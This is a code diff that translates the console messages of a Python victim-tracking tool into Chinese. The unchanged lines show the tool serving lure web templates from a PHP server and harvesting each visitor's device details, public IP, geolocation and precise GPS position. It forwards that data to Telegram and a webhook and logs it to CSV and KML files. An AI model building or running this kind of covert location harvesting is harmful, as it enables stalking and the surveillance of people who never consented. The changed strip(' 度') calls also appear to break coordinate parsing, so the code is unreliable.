@@ -180,7 +180,7 @@ def send_telegram(content, msg_type):
 
 
 def template_select(site):
-    utils.print(f'{Y}[!] Select a Template :{W}\n')
+    utils.print(f'{Y}[!] 选择一个模板 :{W}\n')
 
     with open(TEMPLATES_JSON, 'r') as templ:
         templ_info = templ.read()
@@ -200,23 +200,23 @@ def template_select(site):
             selected = int(input(f'{G}[>] {W}'))
         if selected < 0:
             print()
-            utils.print(f'{R}[-] {C}Invalid Input!{W}')
+            utils.print(f'{R}[-] {C}无效输入!{W}')
             sys.exit()
     except ValueError:
         print()
-        utils.print(f'{R}[-] {C}Invalid Input!{W}')
+        utils.print(f'{R}[-] {C}无效输入!{W}')
         sys.exit()
 
     try:
         site = templ_json['templates'][selected]['dir_name']
     except IndexError:
         print()
-        utils.print(f'{R}[-] {C}Invalid Input!{W}')
+        utils.print(f'{R}[-] {C}无效输入!{W}')
         sys.exit()
 
     print()
     utils.print(
-        f'{G}[+] {C}Loading {Y}{templ_json["templates"][selected]["name"]} {C}Template...{W}'
+        f'{G}[+] {C}正在加载 {Y}{templ_json["templates"][selected]["name"]} {C}模板...{W}'
     )
 
     imp_file = templ_json['templates'][selected]['import_file']
@@ -243,8 +243,8 @@ def template_select(site):
 def server():
     print()
     port_free = False
-    utils.print(f'{G}[+] {C}Port : {W}{port}\n')
-    utils.print(f'{G}[+] {C}Starting PHP Server...{W}', end='')
+    utils.print(f'{G}[+] {C}端口 : {W}{port}\n')
+    utils.print(f'{G}[+] {C}正在启动 PHP 服务器...{W}', end='')
     cmd = ['php', '-S', f'0.0.0.0:{port}', '-t', f'template/{SITE}/']
 
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
@@ -260,9 +260,9 @@ def server():
                 old_proc = psutil.Process(pid)
                 utils.print(f'{C}[ {R}✘{C} ]{W}')
                 utils.print(
-                    f'{Y}[!] Old instance of php server found, restarting...{W}'
+                    f'{Y}[!] 发现旧的 PHP 服务器实例，正在重启...{W}'
                 )
-                utils.print(f'{G}[+] {C}Starting PHP Server...{W}', end='')
+                utils.print(f'{G}[+] {C}正在启动 PHP 服务器...{W}', end='')
                 try:
                     sleep(1)
                     if old_proc.status() != 'running':
@@ -270,7 +270,7 @@ def server():
                     else:
                         utils.print(f'{C}[ {R}✘{C} ]{W}')
                         utils.print(
-                            f'{R}[-] {C}Unable to kill php server process, kill manually{W}'
+                            f'{R}[-] {C}无法终止 PHP 服务器进程，请手动终止{W}'
                         )
                         sys.exit()
                 except psutil.NoSuchProcess:
@@ -278,13 +278,13 @@ def server():
             except psutil.NoSuchProcess:
                 utils.print(f'{C}[ {R}✘{C} ]{W}')
                 utils.print(
-                    f'{R}[-] {C}Port {W}{port} {C}is being used by some other service.{W}'
+                    f'{R}[-] {C}端口 {W}{port} {C}被其他服务占用。{W}'
                 )
                 sys.exit()
     elif not port_free and not path.exists(PID_FILE):
         utils.print(f'{C}[ {R}✘{C} ]{W}')
         utils.print(
-            f'{R}[-] {C}Port {W}{port} {C}is being used by some other service.{W}'
+            f'{R}[-] {C}端口 {W}{port} {C}被其他服务占用。{W}'
         )
         sys.exit()
     elif port_free:
@@ -317,7 +317,7 @@ def wait():
         sleep(2)
         size = path.getsize(RESULT)
         if size == 0 and printed is False:
-            utils.print(f'{G}[+] {C}Waiting for Client...{Y}[ctrl+c to exit]{W}\n')
+            utils.print(f'{G}[+] {C}等待客户端连接...{Y}[ctrl+c 退出]{W}\n')
             printed = True
         if size > 0:
             data_parser()
@@ -358,26 +358,26 @@ def data_parser():
                 var_ip,
             ]
         )
-        device_info = f"""{Y}[!] Device Information :{W}
+        device_info = f"""{Y}[!] 设备信息 :{W}
 
-{G}[+] {C}OS         : {W}{var_os}
-{G}[+] {C}Platform   : {W}{var_platform}
-{G}[+] {C}CPU Cores  : {W}{var_cores}
-{G}[+] {C}RAM        : {W}{var_ram}
-{G}[+] {C}GPU Vendor : {W}{var_vendor}
+{G}[+] {C}操作系统   : {W}{var_os}
+{G}[+] {C}平台       : {W}{var_platform}
+{G}[+] {C}CPU 核心   : {W}{var_cores}
+{G}[+] {C}内存       : {W}{var_ram}
+{G}[+] {C}GPU 供应商 : {W}{var_vendor}
 {G}[+] {C}GPU        : {W}{var_render}
-{G}[+] {C}Resolution : {W}{var_res}
-{G}[+] {C}Browser    : {W}{var_browser}
-{G}[+] {C}Public IP  : {W}{var_ip}
+{G}[+] {C}分辨率     : {W}{var_res}
+{G}[+] {C}浏览器     : {W}{var_browser}
+{G}[+] {C}公网 IP    : {W}{var_ip}
 """
         utils.print(device_info)
         send_telegram(info_json, 'device_info')
         send_webhook(info_json, 'device_info')
 
         if ip_address(var_ip).is_private:
-            utils.print(f'{Y}[!] Skipping IP recon because IP address is private{W}')
+            utils.print(f'{Y}[!] 跳过 IP 侦查，因为 IP 地址是私有地址{W}')
         else:
-            rqst = requests.get(f'https://ipwhois.app/json/{var_ip}')
+            rqst = requests.get(f'https://ipwhois.app/json/{var_ip}?lang=zh-CN')
             s_code = rqst.status_code
 
             if s_code == 200:
@@ -393,13 +393,13 @@ def data_parser():
                 data_row.extend(
                     [var_continent, var_country, var_region, var_city, var_org, var_isp]
                 )
-                ip_info = f"""{Y}[!] IP Information :{W}
+                ip_info = f"""{Y}[!] IP 信息 :{W}
 
-{G}[+] {C}Continent : {W}{var_continent}
-{G}[+] {C}Country   : {W}{var_country}
-{G}[+] {C}Region    : {W}{var_region}
-{G}[+] {C}City      : {W}{var_city}
-{G}[+] {C}Org       : {W}{var_org}
+{G}[+] {C}大洲      : {W}{var_continent}
+{G}[+] {C}国家      : {W}{var_country}
+{G}[+] {C}地区      : {W}{var_region}
+{G}[+] {C}城市      : {W}{var_city}
+{G}[+] {C}组织      : {W}{var_org}
 {G}[+] {C}ISP       : {W}{var_isp}
 """
                 utils.print(ip_info)
@@ -423,21 +423,21 @@ def data_parser():
                 var_spd = result_json['spd']
 
                 data_row.extend([var_lat, var_lon, var_acc, var_alt, var_dir, var_spd])
-                loc_info = f"""{Y}[!] Location Information :{W}
+                loc_info = f"""{Y}[!] 位置信息 :{W}
 
-{G}[+] {C}Latitude  : {W}{var_lat}
-{G}[+] {C}Longitude : {W}{var_lon}
-{G}[+] {C}Accuracy  : {W}{var_acc}
-{G}[+] {C}Altitude  : {W}{var_alt}
-{G}[+] {C}Direction : {W}{var_dir}
-{G}[+] {C}Speed     : {W}{var_spd}
+{G}[+] {C}纬度      : {W}{var_lat}
+{G}[+] {C}经度      : {W}{var_lon}
+{G}[+] {C}精度      : {W}{var_acc}
+{G}[+] {C}海拔      : {W}{var_alt}
+{G}[+] {C}方向      : {W}{var_dir}
+{G}[+] {C}速度      : {W}{var_spd}
 """
                 utils.print(loc_info)
                 send_telegram(result_json, 'location')
                 send_webhook(result_json, 'location')
-                gmaps_url = f'{G}[+] {C}Google Maps : {W}https://www.google.com/maps/place/{var_lat.strip(" deg")}+{var_lon.strip(" deg")}'
+                gmaps_url = f'{G}[+] {C}谷歌地图 : {W}https://www.google.com/maps/place/{var_lat.strip(" 度")}+{var_lon.strip(" 度")}'
                 gmaps_json = {
-                    'url': f'https://www.google.com/maps/place/{var_lat.strip(" deg")}+{var_lon.strip(" deg")}'
+                    'url': f'https://www.google.com/maps/place/{var_lat.strip(" 度")}+{var_lon.strip(" 度")}'
                 }
                 utils.print(gmaps_url)
                 send_telegram(gmaps_json, 'url')
@@ -460,21 +460,21 @@ def kmlout(var_lat, var_lon):
     with open(TEMP_KML, 'r') as kml_sample:
         kml_sample_data = kml_sample.read()
 
-    kml_sample_data = kml_sample_data.replace('LONGITUDE', var_lon.strip(' deg'))
-    kml_sample_data = kml_sample_data.replace('LATITUDE', var_lat.strip(' deg'))
+    kml_sample_data = kml_sample_data.replace('LONGITUDE', var_lon.strip(' 度'))
+    kml_sample_data = kml_sample_data.replace('LATITUDE', var_lat.strip(' 度'))
 
     with open(f'{path_to_script}/{kml_fname}.kml', 'w') as kml_gen:
         kml_gen.write(kml_sample_data)
 
-    utils.print(f'{Y}[!] KML File Generated!{W}')
-    utils.print(f'{G}[+] {C}Path : {W}{path_to_script}/{kml_fname}.kml')
+    utils.print(f'{Y}[!] KML 文件已生成!{W}')
+    utils.print(f'{G}[+] {C}路径 : {W}{path_to_script}/{kml_fname}.kml')
 
 
 def csvout(row):
     with open(DATA_FILE, 'a') as csvfile:
         csvwriter = writer(csvfile)
         csvwriter.writerow(row)
-    utils.print(f'{G}[+] {C}Data Saved : {W}{path_to_script}/db/results.csv\n')
+    utils.print(f'{G}[+] {C}数据已保存 : {W}{path_to_script}/db/results.csv\n')
 
 
 def clear():
@@ -507,7 +507,7 @@ try:
     wait()
     data_parser()
 except KeyboardInterrupt:
-    utils.print(f'{R}[-] {C}Keyboard Interrupt.{W}')
+    utils.print(f'{R}[-] {C}键盘中断。{W}')
     cl_quit()
 else:
     repeat()
